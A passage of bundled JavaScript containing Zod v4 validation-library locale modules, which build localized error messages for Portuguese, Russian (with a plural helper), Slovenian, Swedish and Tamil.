        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Muito grande: esperado que ${issue2.origin ?? "valor"} tivesse ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementos"}`;
        return `Muito grande: esperado que ${issue2.origin ?? "valor"} fosse ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Muito pequeno: esperado que ${issue2.origin} tivesse ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Muito pequeno: esperado que ${issue2.origin} fosse ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Texto inv\xE1lido: deve come\xE7ar com "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Texto inv\xE1lido: deve terminar com "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Texto inv\xE1lido: deve incluir "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Texto inv\xE1lido: deve corresponder ao padr\xE3o ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} inv\xE1lido`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE1lido: deve ser m\xFAltiplo de ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Chave${issue2.keys.length > 1 ? "s" : ""} desconhecida${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Chave inv\xE1lida em ${issue2.origin}`;
      case "invalid_union":
        return "Entrada inv\xE1lida";
      case "invalid_element":
        return `Valor inv\xE1lido em ${issue2.origin}`;
      default:
        return `Campo inv\xE1lido`;
    }
  };
};
function pt_default() {
  return {
    localeError: error34()
  };
}
// node_modules/zod/v4/locales/ru.js
function getRussianPlural(count, one, few, many) {
  const absCount = Math.abs(count);
  const lastDigit = absCount % 10;
  const lastTwoDigits = absCount % 100;
  if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
    return many;
  }
  if (lastDigit === 1) {
    return one;
  }
  if (lastDigit >= 2 && lastDigit <= 4) {
    return few;
  }
  return many;
}
var error35 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0441\u0438\u043C\u0432\u043E\u043B",
        few: "\u0441\u0438\u043C\u0432\u043E\u043B\u0430",
        many: "\u0441\u0438\u043C\u0432\u043E\u043B\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    file: {
      unit: {
        one: "\u0431\u0430\u0439\u0442",
        few: "\u0431\u0430\u0439\u0442\u0430",
        many: "\u0431\u0430\u0439\u0442"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    array: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    set: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0432\u0432\u043E\u0434",
    email: "email \u0430\u0434\u0440\u0435\u0441",
    url: "URL",
    emoji: "\u044D\u043C\u043E\u0434\u0437\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0430 \u0438 \u0432\u0440\u0435\u043C\u044F",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0432\u0440\u0435\u043C\u044F",
    duration: "ISO \u0434\u043B\u0438\u0442\u0435\u043B\u044C\u043D\u043E\u0441\u0442\u044C",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441",
    cidrv4: "IPv4 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    base64: "\u0441\u0442\u0440\u043E\u043A\u0430 \u0432 \u0444\u043E\u0440\u043C\u0430\u0442\u0435 base64",
    base64url: "\u0441\u0442\u0440\u043E\u043A\u0430 \u0432 \u0444\u043E\u0440\u043C\u0430\u0442\u0435 base64url",
    json_string: "JSON \u0441\u0442\u0440\u043E\u043A\u0430",
    e164: "\u043D\u043E\u043C\u0435\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0432\u0432\u043E\u0434"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0447\u0438\u0441\u043B\u043E",
    array: "\u043C\u0430\u0441\u0441\u0438\u0432"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C instanceof ${issue2.expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D\u043E ${received}`;
        }
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C ${expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D\u043E ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C ${stringifyPrimitive(issue2.values[0])}`;
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0430\u0440\u0438\u0430\u043D\u0442: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C \u043E\u0434\u043D\u043E \u0438\u0437 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const maxValue = Number(issue2.maximum);
          const unit = getRussianPlural(maxValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u0431\u043E\u043B\u044C\u0448\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435"} \u0431\u0443\u0434\u0435\u0442 \u0438\u043C\u0435\u0442\u044C ${adj}${issue2.maximum.toString()} ${unit}`;
        }
        return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u0431\u043E\u043B\u044C\u0448\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435"} \u0431\u0443\u0434\u0435\u0442 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          const minValue = Number(issue2.minimum);
          const unit = getRussianPlural(minValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u043C\u0430\u043B\u0435\u043D\u044C\u043A\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue2.origin} \u0431\u0443\u0434\u0435\u0442 \u0438\u043C\u0435\u0442\u044C ${adj}${issue2.minimum.toString()} ${unit}`;
        }
        return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u043C\u0430\u043B\u0435\u043D\u044C\u043A\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue2.origin} \u0431\u0443\u0434\u0435\u0442 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u043D\u0430\u0447\u0438\u043D\u0430\u0442\u044C\u0441\u044F \u0441 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0437\u0430\u043A\u0430\u043D\u0447\u0438\u0432\u0430\u0442\u044C\u0441\u044F \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0441\u043E\u0434\u0435\u0440\u0436\u0430\u0442\u044C "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0441\u043E\u043E\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u043E\u0432\u0430\u0442\u044C \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u043E\u0435 \u0447\u0438\u0441\u043B\u043E: \u0434\u043E\u043B\u0436\u043D\u043E \u0431\u044B\u0442\u044C \u043A\u0440\u0430\u0442\u043D\u044B\u043C ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0441\u043F\u043E\u0437\u043D\u0430\u043D\u043D${issue2.keys.length > 1 ? "\u044B\u0435" : "\u044B\u0439"} \u043A\u043B\u044E\u0447${issue2.keys.length > 1 ? "\u0438" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u043A\u043B\u044E\u0447 \u0432 ${issue2.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u043D\u044B\u0435 \u0434\u0430\u043D\u043D\u044B\u0435";
      case "invalid_element":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435 \u0432 ${issue2.origin}`;
      default:
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u043D\u044B\u0435 \u0434\u0430\u043D\u043D\u044B\u0435`;
    }
  };
};
function ru_default() {
  return {
    localeError: error35()
  };
}
// node_modules/zod/v4/locales/sl.js
var error36 = () => {
  const Sizable = {
    string: { unit: "znakov", verb: "imeti" },
    file: { unit: "bajtov", verb: "imeti" },
    array: { unit: "elementov", verb: "imeti" },
    set: { unit: "elementov", verb: "imeti" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "vnos",
    email: "e-po\u0161tni naslov",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datum in \u010Das",
    date: "ISO datum",
    time: "ISO \u010Das",
    duration: "ISO trajanje",
    ipv4: "IPv4 naslov",
    ipv6: "IPv6 naslov",
    cidrv4: "obseg IPv4",
    cidrv6: "obseg IPv6",
    base64: "base64 kodiran niz",
    base64url: "base64url kodiran niz",
    json_string: "JSON niz",
    e164: "E.164 \u0161tevilka",
    jwt: "JWT",
    template_literal: "vnos"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0161tevilo",
    array: "tabela"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Neveljaven vnos: pri\u010Dakovano instanceof ${issue2.expected}, prejeto ${received}`;
        }
        return `Neveljaven vnos: pri\u010Dakovano ${expected}, prejeto ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Neveljaven vnos: pri\u010Dakovano ${stringifyPrimitive(issue2.values[0])}`;
        return `Neveljavna mo\u017Enost: pri\u010Dakovano eno izmed ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Preveliko: pri\u010Dakovano, da bo ${issue2.origin ?? "vrednost"} imelo ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementov"}`;
        return `Preveliko: pri\u010Dakovano, da bo ${issue2.origin ?? "vrednost"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Premajhno: pri\u010Dakovano, da bo ${issue2.origin} imelo ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Premajhno: pri\u010Dakovano, da bo ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Neveljaven niz: mora se za\u010Deti z "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Neveljaven niz: mora se kon\u010Dati z "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Neveljaven niz: mora vsebovati "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Neveljaven niz: mora ustrezati vzorcu ${_issue.pattern}`;
        return `Neveljaven ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Neveljavno \u0161tevilo: mora biti ve\u010Dkratnik ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Neprepoznan${issue2.keys.length > 1 ? "i klju\u010Di" : " klju\u010D"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Neveljaven klju\u010D v ${issue2.origin}`;
      case "invalid_union":
        return "Neveljaven vnos";
      case "invalid_element":
        return `Neveljavna vrednost v ${issue2.origin}`;
      default:
        return "Neveljaven vnos";
    }
  };
};
function sl_default() {
  return {
    localeError: error36()
  };
}
// node_modules/zod/v4/locales/sv.js
var error37 = () => {
  const Sizable = {
    string: { unit: "tecken", verb: "att ha" },
    file: { unit: "bytes", verb: "att ha" },
    array: { unit: "objekt", verb: "att inneh\xE5lla" },
    set: { unit: "objekt", verb: "att inneh\xE5lla" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "regulj\xE4rt uttryck",
    email: "e-postadress",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-datum och tid",
    date: "ISO-datum",
    time: "ISO-tid",
    duration: "ISO-varaktighet",
    ipv4: "IPv4-intervall",
    ipv6: "IPv6-intervall",
    cidrv4: "IPv4-spektrum",
    cidrv6: "IPv6-spektrum",
    base64: "base64-kodad str\xE4ng",
    base64url: "base64url-kodad str\xE4ng",
    json_string: "JSON-str\xE4ng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "mall-literal"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "antal",
    array: "lista"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ogiltig inmatning: f\xF6rv\xE4ntat instanceof ${issue2.expected}, fick ${received}`;
        }
        return `Ogiltig inmatning: f\xF6rv\xE4ntat ${expected}, fick ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ogiltig inmatning: f\xF6rv\xE4ntat ${stringifyPrimitive(issue2.values[0])}`;
        return `Ogiltigt val: f\xF6rv\xE4ntade en av ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `F\xF6r stor(t): f\xF6rv\xE4ntade ${issue2.origin ?? "v\xE4rdet"} att ha ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "element"}`;
        }
        return `F\xF6r stor(t): f\xF6rv\xE4ntat ${issue2.origin ?? "v\xE4rdet"} att ha ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `F\xF6r lite(t): f\xF6rv\xE4ntade ${issue2.origin ?? "v\xE4rdet"} att ha ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `F\xF6r lite(t): f\xF6rv\xE4ntade ${issue2.origin ?? "v\xE4rdet"} att ha ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Ogiltig str\xE4ng: m\xE5ste b\xF6rja med "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Ogiltig str\xE4ng: m\xE5ste sluta med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ogiltig str\xE4ng: m\xE5ste inneh\xE5lla "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ogiltig str\xE4ng: m\xE5ste matcha m\xF6nstret "${_issue.pattern}"`;
        return `Ogiltig(t) ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ogiltigt tal: m\xE5ste vara en multipel av ${issue2.divisor}`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Ok\xE4nda nycklar" : "Ok\xE4nd nyckel"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ogiltig nyckel i ${issue2.origin ?? "v\xE4rdet"}`;
      case "invalid_union":
        return "Ogiltig input";
      case "invalid_element":
        return `Ogiltigt v\xE4rde i ${issue2.origin ?? "v\xE4rdet"}`;
      default:
        return `Ogiltig input`;
    }
  };
};
function sv_default() {
  return {
    localeError: error37()
  };
}
// node_modules/zod/v4/locales/ta.js
var error38 = () => {
  const Sizable = {
    string: { unit: "\u0B8E\u0BB4\u0BC1\u0BA4\u0BCD\u0BA4\u0BC1\u0B95\u0BCD\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    file: { unit: "\u0BAA\u0BC8\u0B9F\u0BCD\u0B9F\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    array: { unit: "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    set: { unit: "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1",
    email: "\u0BAE\u0BBF\u0BA9\u0BCD\u0BA9\u0B9E\u0BCD\u0B9A\u0BB2\u0BCD \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0BA4\u0BC7\u0BA4\u0BBF \u0BA8\u0BC7\u0BB0\u0BAE\u0BCD",
    date: "ISO \u0BA4\u0BC7\u0BA4\u0BBF",
    time: "ISO \u0BA8\u0BC7\u0BB0\u0BAE\u0BCD",
    duration: "ISO \u0B95\u0BBE\u0BB2 \u0B85\u0BB3\u0BB5\u0BC1",
    ipv4: "IPv4 \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    ipv6: "IPv6 \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    cidrv4: "IPv4 \u0BB5\u0BB0\u0BAE\u0BCD\u0BAA\u0BC1",
    cidrv6: "IPv6 \u0BB5\u0BB0\u0BAE\u0BCD\u0BAA\u0BC1",
    base64: "base64-encoded \u0B9A\u0BB0\u0BAE\u0BCD",
    base64url: "base64url-encoded \u0B9A\u0BB0\u0BAE\u0BCD",
    json_string: "JSON \u0B9A\u0BB0\u0BAE\u0BCD",
    e164: "E.164 \u0B8E\u0BA3\u0BCD",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0B8E\u0BA3\u0BCD",
    array: "\u0B85\u0BA3\u0BBF",
    null: "\u0BB5\u0BC6\u0BB1\u0BC1\u0BAE\u0BC8"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 instanceof ${issue2.expected}, \u0BAA\u0BC6\u0BB1\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${received}`;
        }
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${expected}, \u0BAA\u0BC6\u0BB1\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${stringifyPrimitive(issue2.values[0])}`;
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BB5\u0BBF\u0BB0\u0BC1\u0BAA\u0BCD\u0BAA\u0BAE\u0BCD: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${joinValues(issue2.values, "|")} \u0B87\u0BB2\u0BCD \u0B92\u0BA9\u0BCD\u0BB1\u0BC1`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0BAE\u0BBF\u0B95 \u0BAA\u0BC6\u0BB0\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue2.origin ?? "\u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD"} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        }
        return `\u0BAE\u0BBF\u0B95 \u0BAA\u0BC6\u0BB0\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue2.origin ?? "\u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1"} ${adj}${issue2.maximum.toString()} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0BAE\u0BBF\u0B95\u0B9A\u0BCD \u0B9A\u0BBF\u0BB1\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        }
        return `\u0BAE\u0BBF\u0B95\u0B9A\u0BCD \u0B9A\u0BBF\u0BB1\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue2.origin} ${adj}${issue2.minimum.toString()} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.prefix}" \u0B87\u0BB2\u0BCD \u0BA4\u0BCA\u0B9F\u0B99\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "ends_with")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.suffix}" \u0B87\u0BB2\u0BCD \u0BAE\u0BC1\u0B9F\u0BBF\u0BB5\u0B9F\u0BC8\u0BAF \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "includes")
